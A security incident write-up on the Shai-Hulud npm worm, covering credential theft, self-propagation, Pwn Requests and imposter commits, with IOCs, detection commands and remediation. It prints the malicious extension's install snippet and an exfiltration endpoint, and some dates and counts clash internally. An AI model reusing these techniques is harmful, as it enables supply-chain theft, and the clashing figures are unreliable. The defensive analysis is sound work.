# Shai-Hulud Worm (Two Waves)

**Wave 1:** September 2025
**Wave 2 ("The Second Coming"):** November 21–23, 2025
**Ecosystem:** npm, GitHub, OpenVSX
**Severity:** Critical
**Type:** Self-replicating worm / persistent backdoor / CI/CD secret theft / Pwn Request
**Sources:**
- [aikido.dev — Shai Hulud 2.0: What the Unknown Wonderer Tells Us About the Attackers' Endgame](https://www.aikido.dev/blog/shai-hulud-2-0-unknown-wonderer-supply-chain-attack)
- [semgrep.dev — Security Advisory | NPM Packages Using Secret Scanning Tools to Steal Credentials](https://semgrep.dev/blog/2025/security-advisory-npm-packages-using-secret-scanning-tools-to-steal-credentials/) (Wave 1 primary source)
- [stepsecurity.io — @ctrl/tinycolor and 40 npm Packages Compromised](https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised)
- [socket.dev — tinycolor Supply Chain Attack Affects 40 Packages](https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages)
- [blog.checkpoint.com — Shai-Hulud 2.0: Inside The Second Coming](https://blog.checkpoint.com/research/shai-hulud-2-0-inside-the-second-coming-the-most-aggressive-npm-supply-chain-attack-of-2025)
- CISA Advisory (issued Nov 24, 2025)

---

## Summary

Shai-Hulud is a self-replicating npm supply chain worm named after the sandworms of *Dune*. It operated in two distinct waves in 2025, with the second wave — dubbed **"The Second Coming"** by its operators — being one of the most aggressive and far-reaching npm attacks ever recorded.

**Wave 1 (September 15, 2025):** Initial detection — `@ctrl/tinycolor` (8M+ monthly downloads) used as anchor package. The worm used **TruffleHog** to validate stolen credentials before exfiltrating them to `webhook.site` and public GitHub repos named "Shai-Hulud". 187+ packages compromised. Results in theft of approximately **$50 million in cryptocurrency**.

**Wave 2 (November 21–23, 2025):** "The Second Coming" — expanded payloads, Bun runtime evasion, OpenVSX extension propagation via Pwn Request, broader automation. Between November 21–23, attackers compromised hundreds of packages and **more than 25,000 GitHub repositories in only a few hours**.

---

## Wave 1 — How It Worked (Sep 15, 2025)

### Anchor Package & Scale

The initial compromise was detected September 15, 2025 at 11:11 AM PDT via social media reports about `@ctrl/tinycolor`. Semgrep's first formal alert was at 4:23 PM PDT. npm rapidly unpublished compromised versions, but the worm had already self-replicated.

**Final scale:** 187+ compromised packages (growing, as new waves were detected through Sep 22)

### TruffleHog Credential Validation

Wave 1's defining technical novelty: rather than blindly exfiltrating all secrets, the malware used **TruffleHog** — a well-known open-source secret scanning tool — to **validate credentials before sending them**. This separated live, usable tokens from expired or dummy values, making the attack dramatically more precise and efficient.

After scanning the filesystem and environment, TruffleHog validated keys such as:
- AWS keys (checking against AWS STS)
- GitHub/npm tokens (checking against API)

Only validated, active credentials were exfiltrated.

### Exfiltration Channels

1. **`webhook.site`** endpoint: `bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`
2. **Public GitHub repository** named `Shai-Hulud` — created on victim's account, same pattern as the NX attack one week earlier

A GitHub Actions workflow (`shai-hulud-workflow.yml`) POSTed results to the attacker's webhook.

### Self-Propagation

If valid npm tokens were found, the worm:
1. Called `npm whoami` to identify the token owner's account
2. Enumerated all packages that account could publish
3. Bumped the patch version and republished each with the malware embedded

This is the mechanism by which 187+ packages were infected from a single initial foothold.

### Wave 1 — Confirmed Compromised Packages (Sample)

| Package | Malicious Versions |
|---------|-------------------|
| `@ctrl/tinycolor` | 4.1.1, 4.1.2 |
| `@crowdstrike/foundry-js` | 0.19.1, 0.19.2 |
| `@crowdstrike/glide-core` | 0.34.2, 0.34.3 |
| `@crowdstrike/tailwind-toucan-base` | 5.0.1, 5.0.2 |
| `ngx-toastr` | 19.0.1, 19.0.2, 20.0.3–20.0.5 |
| `ngx-bootstrap` | 18.1.4, 19.0.3, 19.0.4, 20.0.3–20.0.5 |
| `angulartics2` | 14.1.1, 14.1.2 |
| `@nativescript-community/*` | Multiple (gesturehandler, sqlite, text, typeorm, etc.) |
| `@nstudio/xplat` | 20.0.5–20.0.7 |

> Full list of 187+ packages with versions: [Semgrep advisory](https://semgrep.dev/blog/2025/security-advisory-npm-packages-using-secret-scanning-tools-to-steal-credentials/)

### Wave 1 IOCs

| Type | Value |
|------|-------|
| Exfiltration endpoint | `webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7` |
| GitHub repo name | `Shai-Hulud` (public, on victim accounts) |
| Workflow file | `.github/workflows/shai-hulud-workflow.yml` |
| Known payload hashes | `de0e25a3...`, `81d2a004...`, `83a650ce...`, `4b239964...` (see Semgrep advisory) |

---

## Wave 2 — Scale of Impact (Nov 2025)

| Metric | Count |
|--------|-------|
| Infected npm packages | 621 |
| Compromised GitHub repositories | 25,000+ |
| Affected GitHub organizations | 487 |
| Total leaked secrets | 14,206 |
| Valid (non-duplicate) secrets | Substantial subset confirmed |

**Verified exposed credentials (from ~20,000 repos reviewed):**
- 775 GitHub access tokens
- 373 AWS credentials
- 300 GCP credentials
- 115 Azure credentials

---

## How It Works

### Infection Entry Point

The attack starts with trusted or lookalike npm packages — either **hijacked legitimate packages** or newly published malicious ones. Once a developer installs an affected package, the malicious code fires during the **`preinstall` lifecycle step**, giving the attacker execution inside the dev or build environment _before installation even completes_, and even if it fails.

### Two-Component Payload

**`setup_bun.js`** — Installs the [Bun](https://bun.sh) JavaScript runtime.

**`bun_environment.js`** — Executes the core malicious logic.

Using **Bun instead of Node.js** is a deliberate evasion technique. Most security tools and sandboxes are optimized to track Node.js behavior. Bun-based execution flies under most detection radars.

### Secret Harvesting

Once executed, the malware enumerates and collects:
- Environment variables
- SSH keys
- GitHub tokens
- npm tokens
- CI/CD pipeline variables
- Cloud credentials (AWS, Azure, GCP)

Secrets are structured into JSON files: `cloud.json`, `environment.json`, `actionsSecrets.json`.

### GitHub-Based Exfiltration

Rather than using external C2 servers, the attackers **exfiltrate directly to public GitHub repositories** labelled `Sha1-Hulud: The Second Coming`. This blends malicious traffic into legitimate GitHub API calls, making it significantly harder to detect at the network layer.

### Persistence & Long-Term Access

After exfiltration, the malware:
1. **Registers infected systems as self-hosted GitHub runners**, enabling the attacker to execute arbitrary workflows remotely
2. **Inserts rogue workflow files** into victim repositories for long-term access, even after the compromised package is removed
3. Contains a **destructive failsafe** capable of wiping local files when it detects containment or analysis attempts

### Self-Propagation

Stolen npm tokens are used to:
1. Query the npm registry for all packages the token has publish access to
2. Download the latest version of each
3. Inject the worm payload
4. Publish a new patch/minor version as the default install

The result: each infected developer becomes a propagation vector for every package they maintain.

### OpenVSX Extension Propagation (Wave 2 Entrypoint)

Wave 2's first spread came not from npm but from the **OpenVSX extension marketplace**, demonstrating the worm's expansion into new ecosystems.

The attacker (GitHub username `vskpsfkbjs`, later renamed to `UnknownWonderer1`) used a two-part technique to propagate through the `asyncapi/asyncapi-preview` VS Code extension:

#### Pwn Request

A **Pwn Request** is a pull request from a fork that causes the upstream repository's CI/CD workflows to execute code from the fork — giving the attacker execution inside the upstream context without ever merging.

The attacker:
1. Created a malicious file (`.github/workflows/changeset-utils/index.js`) in their fork with an exfiltration payload
2. Opened a PR to `asyncapi/cli` — this triggered the upstream CI, which checked out the fork's code, running the malicious workflow file inside the official repository's context
3. The malicious CI script sent the repository's GitHub token to an attacker-controlled webhook
4. Closed the PR 2 minutes and 44 seconds later to erase tracks

#### Repository Confusion (Imposter Commits)

With the stolen GitHub token, the attacker then:
1. Created a commit on their fork that replaced the entire `asyncapi/cli` repo with just a `package.json` and `setup_bun.js` worm payload
2. Published a malicious version of the `asyncapi/asyncapi-preview` OpenVSX extension

The extension's activation code appeared innocent:

```js
const e = a.spawn("npm", ["install",
  "github:asyncapi/cli#2efa4dff59bc3d3cecdf897ccf178f99b115d63d"],
  { detached: true, stdio: "ignore" });
```

This looks like it installs from the official `asyncapi/cli` repository. But due to **GitHub's Imposter Commits behavior**: commits from a fork can be accessed via the upstream repository's URL using the commit SHA. The hash `2efa4dff...` existed in the attacker's fork — but GitHub allowed it to resolve through `asyncapi/cli`'s URL, making the malicious payload appear to come from a trusted source.

#### Threat Actor Identity

The attacker's GitHub username `UnknownWonderer1` is a deliberate reference to the **Zensunni Wanderers** from Dune — nomadic people who became the Fremen, the only culture in tune with Shai-Hulud (the sandworms). Aikido's analysis suggests this framing is intentional: someone who sees themselves as an overlooked outsider exposing the fragility of over-trusted automated systems.

---

## Timeline

| Date | Event |
|------|-------|
| Sep 15, 11:11 AM PDT | First social media reports of suspicious @ctrl/tinycolor activity |
| Sep 15, 4:23 PM PDT | Semgrep and Socket publish formal advisories; tinycolor confirmed as anchor package |
| Sep 15–22, 2025 | Multiple new waves of compromised packages detected; count grows to 187+ |
| Sep 16, 2025 | Step Security publishes technical analysis of worm propagation via npm tokens |
| Sep 22, 2025 | Semgrep updates advisory with additional waves and IOCs |
| Nov 22, 2025 16:06 UTC | Attacker (vskpsfkbjs / UnknownWonderer1) plants malicious fork commit in asyncapi/cli — "Pwn Request" preparation |
| Nov 22, 2025 16:38 UTC | Malicious PR submitted to asyncapi/cli, triggering CI exfiltration of GitHub token |
| Nov 22, 2025 16:40 UTC | PR closed to erase tracks (2 min 44 sec after opening) |
| Nov 23, 2025 22:56 UTC | Worm payload committed to asyncapi/cli fork commit (deletes all files, adds `setup_bun.js`) |
| Nov 23, 2025 23:36 UTC | Malicious `asyncapi/asyncapi-preview` OpenVSX extension published (Wave 2 begins) |
| Nov 21–23, 2025 | Wave 2 ("The Second Coming") across npm — expanded payloads and automation |
| Nov 24, 2025 | Security vendors begin publishing alerts; CISA issues advisory |
| Dec 2, 2025 | Aikido publishes "Unknown Wonderer" analysis with full Pwn Request timeline |
| Dec 22, 2025 | Shai-Hulud 2.0 confirmed to have exposed 33,185 unique secrets across 20,649 scanned repositories |

---

## Detection

```bash
# Check known Wave 1 anchor packages
npm ls @ctrl/tinycolor   # malicious: 4.1.1, 4.1.2
npm ls @crowdstrike/foundry-js  # malicious: 0.19.1, 0.19.2
npm ls ngx-toastr        # malicious: 19.0.1, 19.0.2
npm ls ngx-bootstrap     # malicious: 18.1.4, 19.0.3+

# Check for the Wave 1 shai-hulud workflow artifact
find . -name "shai-hulud-workflow.yml" -path "*/.github/workflows/*"

# Check for Wave 1 payload hashes
find . -type f -name "*.js" -exec sha256sum {} \; 2>/dev/null | grep -E \
  "de0e25a3|81d2a004|83a650ce|4b239964|dc67467a|46faab8a|b74caeaa"

# Check for outbound connections to Wave 1 C2
# Look in CI/CD logs for calls to:
# webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7

# Check GitHub security log for Shai-Hulud repos
# https://github.com/settings/security-log?q=operation%3AcreateRepo

# Look for unexpected Bun installations (Wave 2 evasion technique)
which bun
ls ~/.bun/

# Check for rogue GitHub Actions runners
# In your GitHub org settings → Settings → Actions → Runners
# Look for unknown self-hosted runners

# Audit for unauthorized rogue workflow files
git log --all --oneline -- .github/workflows/

# Check for unauthorized npm publishes on packages you own
npm view <your-package> time --json | tail -5

# Check for the malicious asyncapi-preview OpenVSX extension
# If installed in VS Code, inspect: ~/.vscode/extensions/asyncapi.asyncapi-preview-*
ls ~/.vscode/extensions/ | grep asyncapi
```

Check for "Imposter Commit" references in any GitHub Actions workflows or npm install scripts:
```bash
# Look for github:<org>/<repo>#<hash> install patterns in package.json
grep -r "github:asyncapi" package.json package-lock.json
```

---

## Remediation

1. **Audit all dependency manifests and lockfiles** — remove compromised packages and reinstall from trusted sources
2. **Clear the npm cache:** `npm cache clean --force`
3. **Rotate ALL secrets** used in development and CI/CD: GitHub tokens, npm tokens, AWS/GCP/Azure credentials, SSH keys
4. **Inspect GitHub runners** — delete any unauthorized or unknown self-hosted runner entries in your org
5. **Remove rogue workflow files** — audit `.github/workflows/` for unexpected additions
6. Check if any packages you maintain had unauthorized versions published; unpublish them immediately

---

## Preventive Measures

- Enforce MFA on all GitHub and npm accounts (use hardware security keys where possible)
- Monitor for unexpected repositories created within GitHub organizations
- Apply SBOM-based scanning with integrity checks on every install
- **Never use `npm install` in CI/CD** — use `npm ci` to enforce lockfile integrity
- Strengthen CI/CD isolation: secrets should be scoped, short-lived, and not logged
- Consider `--ignore-scripts` flag for packages you don't fully trust: `npm install --ignore-scripts`

---

## Lessons Learned

- **Preinstall scripts are a critical attack surface.** The worm fires _before_ installation completes, bypassing controls that only run post-install.
- **Runtime evasion is evolving.** Using Bun specifically to avoid Node.js-focused detection tools demonstrates attackers actively researching and bypassing security tooling.
- **GitHub as exfiltration channel.** Sending stolen secrets to public GitHub repos via the API is nearly indistinguishable from legitimate developer activity at the network layer.
- **Self-hosted runners are a high-value target.** Once an attacker registers a runner in your org, they have persistent, on-demand code execution in your CI/CD environment.
- **Pwn Requests are a legitimate threat.** Any GitHub Actions workflow that checks out code from a PR fork and runs it in an elevated context is potentially vulnerable to this technique. Audit your workflows for `pull_request_target` with untrusted code execution.
- **Imposter Commits blur repository boundaries.** A commit SHA from a fork can be referenced through the upstream repository URL on GitHub — `github:<owner>/<repo>#<sha>` is not a guarantee of origin. Verify commits by their position in the actual repository graph, not just their SHA.
- **Extension marketplaces expand the attack surface.** The worm's jump from npm to OpenVSX shows that any trusted package ecosystem can be used as a delivery vector when developer accounts are compromised.

---

## Related Incidents

- [The Great npm Heist (Sep 2025)](./2025-09-great-npm-heist.md) — concurrent Wave 1 activity
- [GlassWorm / CanisterWorm (Mar 2026)](./2026-03-glassworm-canisterworm.md) — CanisterWorm uses an identical ICP-based propagation pattern
